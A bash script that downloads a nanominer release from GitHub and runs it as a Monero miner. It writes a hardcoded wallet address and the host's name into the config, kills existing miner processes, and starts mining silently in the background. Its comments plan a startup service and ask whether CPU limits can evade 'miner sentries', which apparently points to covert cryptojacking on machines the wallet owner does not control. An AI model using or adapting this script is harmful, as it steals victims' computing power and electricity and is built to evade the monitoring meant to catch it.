#!/bin/bash

VERSION=1.0.1

echo "Setup script version $VERSION."
echo "Downloading nanominer..."

wget -q https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz
tar -xf nanominer-linux-3.3.4.tar.xz
cd nanominer-linux-3.3.4

echo "Download and extraction completed successfully."

# X-Mode - No limit on cpu threads
# Touch so that rm daent fail, hackity ah!
touch config.ini
rm config.ini

# Read minus-cores input param, if empty, use 0
# Command line args - first param is number of cores less to use
RESTRICT=$1

echo "Configuring miner..."

echo "[RandomX]" >> config.ini
echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
echo "rigName = " `cat /proc/sys/kernel/hostname` >> config.ini
echo "email = yokohama@mailinator.com" >> config.ini
echo "sortPools = true" >> config.ini 

# Check for core restrictions

if [ -z $RESTRICT ]; then
  echo "No core usage restriction specified, using all cores."
else
  echo "CPU Restricted, using one core less, ~83% for an 8 Core CPU"

  echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'` >> config.ini
fi

# Some refinements needed:
# Always check nanominer is not running before starting
# Enable run on startup - with a service, in the background

# Kill all others incase they were running -- helpfull to quickly run a new configuration
killall nanominer

# Start as a background process
nohup ./nanominer >/dev/null 2>&1 & 

echo ""
echo "Current configuration:"

cat config.ini

echo "Setup complete, mining in progress"

# Think about using CPU limit instead od core count? Avoid flatline high cpu usage? Can this fly below the miner sentries?